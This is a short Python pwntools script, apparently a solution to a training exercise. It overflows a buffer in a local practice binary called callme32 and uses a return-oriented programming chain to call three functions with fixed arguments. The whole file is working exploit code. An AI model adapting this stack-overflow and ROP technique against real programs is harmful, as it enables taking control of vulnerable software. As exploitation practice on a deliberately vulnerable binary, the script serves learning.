from pwn import *

context.arch = 'i386'
prog = process("./callme32")

# 0x080487f9: pop esi; pop edi; pop ebp; ret;
pop_0 = p32(0x080487f9)
# callme_one()
func_callme_one = p32(0x080484f0)
# callme_two()
func_callme_two = p32(0x08048550)
# callme_three()
func_callme_three = p32(0x080484e0)
# argument 1
arg_0 = p32(0xdeadbeef)
# argument 2
arg_1 = p32(0xcafebabe)
# argument 3
arg_2 = p32(0xd00df00d)

payload = b'a' * 44
# call callme_one()
payload += func_callme_one
# pop arguments into esi, edi, ebp
payload += pop_0
payload += arg_0
payload += arg_1
payload += arg_2

# call callme_two()
payload += func_callme_two
# pop arguments into esi, edi, ebp
payload += pop_0
payload += arg_0
payload += arg_1
payload += arg_2

# call callme_three()
payload += func_callme_three
# pop arguments into esi, edi, ebp
payload += pop_0
payload += arg_0
payload += arg_1
payload += arg_2

print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
